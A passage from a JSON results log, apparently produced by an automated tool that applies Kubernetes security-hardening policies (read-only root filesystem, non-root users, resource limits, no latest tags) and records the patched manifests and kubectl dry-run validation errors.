    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: restrictedvolumes10\nspec:\n  containers:\n  - image: k8s.gcr.io/pause:stable\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      privileged: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  initContainers:\n  - image: k8s.gcr.io/pause:stable\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      privileged: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  securityContext:\n    runAsNonRoot: true\n  volumes:\n  - flocker:\n      datasetName: test\n    name: volume1\n",
    "errors": []
  },
  {
    "id": "01245",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: restrictedvolumes10\nspec:\n  containers:\n  - image: k8s.gcr.io/pause:stable\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      privileged: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  initContainers:\n  - image: k8s.gcr.io/pause:stable\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      privileged: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  securityContext:\n    runAsNonRoot: true\n  volumes:\n  - flocker:\n      datasetName: test\n    name: volume1\n",
    "errors": []
  },
  {
    "id": "01246",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: restrictedvolumes10\nspec:\n  containers:\n  - image: k8s.gcr.io/pause:stable\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      readOnlyRootFilesystem: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      runAsNonRoot: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  initContainers:\n  - image: k8s.gcr.io/pause:stable\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      readOnlyRootFilesystem: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      runAsNonRoot: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  securityContext:\n    runAsNonRoot: true\n  volumes:\n  - flocker:\n      datasetName: test\n    name: volume1\n",
    "errors": []
  },
  {
    "id": "01247",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: restrictedvolumes10\nspec:\n  containers:\n  - image: k8s.gcr.io/pause:stable\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      readOnlyRootFilesystem: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      runAsNonRoot: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  initContainers:\n  - image: k8s.gcr.io/pause:stable\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      readOnlyRootFilesystem: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      runAsNonRoot: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  securityContext:\n    runAsNonRoot: true\n  volumes:\n  - flocker:\n      datasetName: test\n    name: volume1\n",
    "errors": []
  },
  {
    "id": "01248",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: restrictedvolumes10\nspec:\n  containers:\n  - image: k8s.gcr.io/pause:stable\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  initContainers:\n  - image: k8s.gcr.io/pause:stable\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  securityContext:\n    runAsNonRoot: true\n  volumes:\n  - flocker:\n      datasetName: test\n    name: volume1\n",
    "errors": []
  },
  {
    "id": "01249",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: restrictedvolumes10\nspec:\n  containers:\n  - image: k8s.gcr.io/pause:stable\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  initContainers:\n  - image: k8s.gcr.io/pause:stable\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  securityContext:\n    runAsNonRoot: true\n  volumes:\n  - flocker:\n      datasetName: test\n    name: volume1\n",
    "errors": []
  },
  {
    "id": "01250",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: restrictedvolumes10\nspec:\n  containers:\n  - image: k8s.gcr.io/pause:stable\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  initContainers:\n  - image: k8s.gcr.io/pause:stable\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  securityContext:\n    runAsNonRoot: true\n  volumes:\n  - flocker:\n      datasetName: test\n    name: volume1\n",
    "errors": []
  },
  {
    "id": "01251",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: restrictedvolumes10\nspec:\n  containers:\n  - image: k8s.gcr.io/pause:stable\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  initContainers:\n  - image: k8s.gcr.io/pause:stable\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  securityContext:\n    runAsNonRoot: true\n  volumes:\n  - flocker:\n      datasetName: test\n    name: volume1\n",
    "errors": []
  },
  {
    "id": "01252",
    "policy_id": "env_var_secret",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Deployment \"kurl-proxy-kotsadm\" is invalid: \n* metadata.labels: Invalid value: \"\\\\\\\"true\\\\\\\"\": a valid label must be an empty string or consist of alphanumeric characters, '-', '_' or '.', and must start and end with an alphanumeric character (e.g. 'MyValue',  or 'my_value',  or '12345', regex used for validation is '(([A-Za-z0-9][-A-Za-z0-9_.]*)?[A-Za-z0-9])?')\n* spec.template.labels: Invalid value: \"\\\\\\\"true\\\\\\\"\": a valid label must be an empty string or consist of alphanumeric characters, '-', '_' or '.', and must start and end with an alphanumeric character (e.g. 'MyValue',  or 'my_value',  or '12345', regex used for validation is '(([A-Za-z0-9][-A-Za-z0-9_.]*)?[A-Za-z0-9])?')"
    ]
  },
  {
    "id": "01253",
    "policy_id": "read_only_root_fs",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Deployment \"kurl-proxy-kotsadm\" is invalid: \n* metadata.labels: Invalid value: \"\\\\\\\"true\\\\\\\"\": a valid label must be an empty string or consist of alphanumeric characters, '-', '_' or '.', and must start and end with an alphanumeric character (e.g. 'MyValue',  or 'my_value',  or '12345', regex used for validation is '(([A-Za-z0-9][-A-Za-z0-9_.]*)?[A-Za-z0-9])?')\n* spec.template.labels: Invalid value: \"\\\\\\\"true\\\\\\\"\": a valid label must be an empty string or consist of alphanumeric characters, '-', '_' or '.', and must start and end with an alphanumeric character (e.g. 'MyValue',  or 'my_value',  or '12345', regex used for validation is '(([A-Za-z0-9][-A-Za-z0-9_.]*)?[A-Za-z0-9])?')"
    ]
  },
  {
    "id": "01254",
    "policy_id": "run_as_non_root",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Deployment \"kurl-proxy-kotsadm\" is invalid: \n* metadata.labels: Invalid value: \"\\\\\\\"true\\\\\\\"\": a valid label must be an empty string or consist of alphanumeric characters, '-', '_' or '.', and must start and end with an alphanumeric character (e.g. 'MyValue',  or 'my_value',  or '12345', regex used for validation is '(([A-Za-z0-9][-A-Za-z0-9_.]*)?[A-Za-z0-9])?')\n* spec.template.labels: Invalid value: \"\\\\\\\"true\\\\\\\"\": a valid label must be an empty string or consist of alphanumeric characters, '-', '_' or '.', and must start and end with an alphanumeric character (e.g. 'MyValue',  or 'my_value',  or '12345', regex used for validation is '(([A-Za-z0-9][-A-Za-z0-9_.]*)?[A-Za-z0-9])?')"
    ]
  },
  {
    "id": "01255",
    "policy_id": "read_only_root_fs",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Deployment \"fb-user-datastore-api-{{ .Values.environmentName }}\" is invalid: \n* metadata.name: Invalid value: \"fb-user-datastore-api-{{ .Values.environmentName }}\": a lowercase RFC 1123 subdomain must consist of lower case alphanumeric characters, '-' or '.', and must start and end with an alphanumeric character (e.g. 'example.com', regex used for validation is '[a-z0-9]([-a-z0-9]*[a-z0-9])?(\\.[a-z0-9]([-a-z0-9]*[a-z0-9])?)*')\n* spec.selector.matchLabels: Invalid value: \"fb-user-datastore-api-{{ .Values.environmentName }}\": a valid label must be an empty string or consist of alphanumeric characters, '-', '_' or '.', and must start and end with an alphanumeric character (e.g. 'MyValue',  or 'my_value',  or '12345', regex used for validation is '(([A-Za-z0-9][-A-Za-z0-9_.]*)?[A-Za-z0-9])?')\n* spec.selector: Invalid value: {\"matchLabels\":{\"app\":\"fb-user-datastore-api-{{ .Values.environmentName }}\"}}: invalid label selector"
    ]
  },
  {
    "id": "01256",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Deployment \"fb-user-datastore-api-{{ .Values.environmentName }}\" is invalid: \n* metadata.name: Invalid value: \"fb-user-datastore-api-{{ .Values.environmentName }}\": a lowercase RFC 1123 subdomain must consist of lower case alphanumeric characters, '-' or '.', and must start and end with an alphanumeric character (e.g. 'example.com', regex used for validation is '[a-z0-9]([-a-z0-9]*[a-z0-9])?(\\.[a-z0-9]([-a-z0-9]*[a-z0-9])?)*')\n* spec.selector.matchLabels: Invalid value: \"fb-user-datastore-api-{{ .Values.environmentName }}\": a valid label must be an empty string or consist of alphanumeric characters, '-', '_' or '.', and must start and end with an alphanumeric character (e.g. 'MyValue',  or 'my_value',  or '12345', regex used for validation is '(([A-Za-z0-9][-A-Za-z0-9_.]*)?[A-Za-z0-9])?')\n* spec.selector: Invalid value: {\"matchLabels\":{\"app\":\"fb-user-datastore-api-{{ .Values.environmentName }}\"}}: invalid label selector"
    ]
  },
  {
    "id": "01257",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Deployment \"fb-user-datastore-api-{{ .Values.environmentName }}\" is invalid: \n* metadata.name: Invalid value: \"fb-user-datastore-api-{{ .Values.environmentName }}\": a lowercase RFC 1123 subdomain must consist of lower case alphanumeric characters, '-' or '.', and must start and end with an alphanumeric character (e.g. 'example.com', regex used for validation is '[a-z0-9]([-a-z0-9]*[a-z0-9])?(\\.[a-z0-9]([-a-z0-9]*[a-z0-9])?)*')\n* spec.selector.matchLabels: Invalid value: \"fb-user-datastore-api-{{ .Values.environmentName }}\": a valid label must be an empty string or consist of alphanumeric characters, '-', '_' or '.', and must start and end with an alphanumeric character (e.g. 'MyValue',  or 'my_value',  or '12345', regex used for validation is '(([A-Za-z0-9][-A-Za-z0-9_.]*)?[A-Za-z0-9])?')\n* spec.selector: Invalid value: {\"matchLabels\":{\"app\":\"fb-user-datastore-api-{{ .Values.environmentName }}\"}}: invalid label selector"
    ]
  },
  {
    "id": "01258",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: echo\nspec:\n  selector:\n    matchLabels:\n      app: echo\n  template:\n    metadata:\n      labels:\n        app: echo\n    spec:\n      volumes:\n      - name: nfs-mount\n        persistentVolumeClaim:\n          claimName: nfs-for-pods\n      containers:\n      - image: busybox:stable\n        name: echo\n        volumeMounts:\n        - mountPath: /data\n          name: nfs-mount\n        command:\n        - ping\n        - 127.0.0.1\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01259",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: echo\nspec:\n  selector:\n    matchLabels:\n      app: echo\n  template:\n    metadata:\n      labels:\n        app: echo\n    spec:\n      volumes:\n      - name: nfs-mount\n        persistentVolumeClaim:\n          claimName: nfs-for-pods\n      containers:\n      - image: busybox:stable\n        name: echo\n        volumeMounts:\n        - mountPath: /data\n          name: nfs-mount\n        command:\n        - ping\n        - 127.0.0.1\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01260",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: echo\nspec:\n  selector:\n    matchLabels:\n      app: echo\n  template:\n    metadata:\n      labels:\n        app: echo\n    spec:\n      volumes:\n      - name: nfs-mount\n        persistentVolumeClaim:\n          claimName: nfs-for-pods\n      containers:\n      - image: busybox:stable\n        name: echo\n        volumeMounts:\n        - mountPath: /data\n          name: nfs-mount\n        command:\n        - ping\n        - 127.0.0.1\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01261",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: echo\nspec:\n  selector:\n    matchLabels:\n      app: echo\n  template:\n    metadata:\n      labels:\n        app: echo\n    spec:\n      volumes:\n      - name: nfs-mount\n        persistentVolumeClaim:\n          claimName: nfs-for-pods\n      containers:\n      - image: busybox:stable\n        name: echo\n        volumeMounts:\n        - mountPath: /data\n          name: nfs-mount\n        command:\n        - ping\n        - 127.0.0.1\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01262",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: echo\nspec:\n  selector:\n    matchLabels:\n      app: echo\n  template:\n    metadata:\n      labels:\n        app: echo\n    spec:\n      volumes:\n      - name: nfs-mount\n        persistentVolumeClaim:\n          claimName: nfs-for-pods\n      containers:\n      - image: busybox:stable\n        name: echo\n        volumeMounts:\n        - mountPath: /data\n          name: nfs-mount\n        command:\n        - ping\n        - 127.0.0.1\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01263",
    "policy_id": "read_only_root_fs",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: error when retrieving current configuration of:\nResource: \"batch/v1, Resource=jobs\", GroupVersionKind: \"batch/v1, Kind=Job\"\nName: \"\", Namespace: \"e2e\"\nfrom server for: \"STDIN\": resource name may not be empty"
    ]
  },
  {
    "id": "01264",
    "policy_id": "run_as_non_root",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: error when retrieving current configuration of:\nResource: \"batch/v1, Resource=jobs\", GroupVersionKind: \"batch/v1, Kind=Job\"\nName: \"\", Namespace: \"e2e\"\nfrom server for: \"STDIN\": resource name may not be empty"
    ]
  },
  {
    "id": "01265",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: error when retrieving current configuration of:\nResource: \"batch/v1, Resource=jobs\", GroupVersionKind: \"batch/v1, Kind=Job\"\nName: \"\", Namespace: \"e2e\"\nfrom server for: \"STDIN\": resource name may not be empty"
    ]
  },
  {
    "id": "01266",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: error when retrieving current configuration of:\nResource: \"batch/v1, Resource=jobs\", GroupVersionKind: \"batch/v1, Kind=Job\"\nName: \"\", Namespace: \"e2e\"\nfrom server for: \"STDIN\": resource name may not be empty"
    ]
  },
  {
    "id": "01267",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: olm-operator\n  namespace: openshift-operator-lifecycle-manager\n  labels:\n    app: olm-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: olm-operator\n  template:\n    metadata:\n      labels:\n        app: olm-operator\n    spec:\n      serviceAccountName: olm-operator-serviceaccount\n      containers:\n      - name: olm-operator\n        command:\n        - /bin/olm\n        args:\n        - --namespace\n        - $(OPERATOR_NAMESPACE)\n        - --writeStatusName\n        - operator-lifecycle-manager\n        - --writePackageServerStatusName\n        - operator-lifecycle-manager-packageserver\n        - --tls-cert\n        - /var/run/secrets/serving-cert/tls.crt\n        - --tls-key\n        - /var/run/secrets/serving-cert/tls.key\n        image: quay.io/operator-framework/olm@sha256:b9d011c0fbfb65b387904f8fafc47ee1a9479d28d395473341288ee126ed993b\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        - containerPort: 8081\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n        env:\n        - name: RELEASE_VERSION\n          value: 0.0.1-snapshot\n        - name: OPERATOR_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: OPERATOR_NAME\n          value: olm-operator\n        resources:\n          requests:\n            cpu: 10m\n            memory: 160Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        volumeMounts:\n        - mountPath: /var/run/secrets/serving-cert\n          name: serving-cert\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n      volumes:\n      - name: serving-cert\n        secret:\n          secretName: olm-operator-serving-cert\n",
    "errors": []
  },
  {
    "id": "01268",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: olm-operator\n  namespace: openshift-operator-lifecycle-manager\n  labels:\n    app: olm-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: olm-operator\n  template:\n    metadata:\n      labels:\n        app: olm-operator\n    spec:\n      serviceAccountName: olm-operator-serviceaccount\n      containers:\n      - name: olm-operator\n        command:\n        - /bin/olm\n        args:\n        - --namespace\n        - $(OPERATOR_NAMESPACE)\n        - --writeStatusName\n        - operator-lifecycle-manager\n        - --writePackageServerStatusName\n        - operator-lifecycle-manager-packageserver\n        - --tls-cert\n        - /var/run/secrets/serving-cert/tls.crt\n        - --tls-key\n        - /var/run/secrets/serving-cert/tls.key\n        image: quay.io/operator-framework/olm@sha256:b9d011c0fbfb65b387904f8fafc47ee1a9479d28d395473341288ee126ed993b\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        - containerPort: 8081\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n        env:\n        - name: RELEASE_VERSION\n          value: 0.0.1-snapshot\n        - name: OPERATOR_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: OPERATOR_NAME\n          value: olm-operator\n        resources:\n          requests:\n            cpu: 10m\n            memory: 160Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        volumeMounts:\n        - mountPath: /var/run/secrets/serving-cert\n          name: serving-cert\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: serving-cert\n        secret:\n          secretName: olm-operator-serving-cert\n",
    "errors": []
  },
  {
    "id": "01269",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: olm-operator\n  namespace: openshift-operator-lifecycle-manager\n  labels:\n    app: olm-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: olm-operator\n  template:\n    metadata:\n      labels:\n        app: olm-operator\n    spec:\n      serviceAccountName: olm-operator-serviceaccount\n      containers:\n      - name: olm-operator\n        command:\n        - /bin/olm\n        args:\n        - --namespace\n        - $(OPERATOR_NAMESPACE)\n        - --writeStatusName\n        - operator-lifecycle-manager\n        - --writePackageServerStatusName\n        - operator-lifecycle-manager-packageserver\n        - --tls-cert\n        - /var/run/secrets/serving-cert/tls.crt\n        - --tls-key\n        - /var/run/secrets/serving-cert/tls.key\n        image: quay.io/operator-framework/olm@sha256:b9d011c0fbfb65b387904f8fafc47ee1a9479d28d395473341288ee126ed993b\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        - containerPort: 8081\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          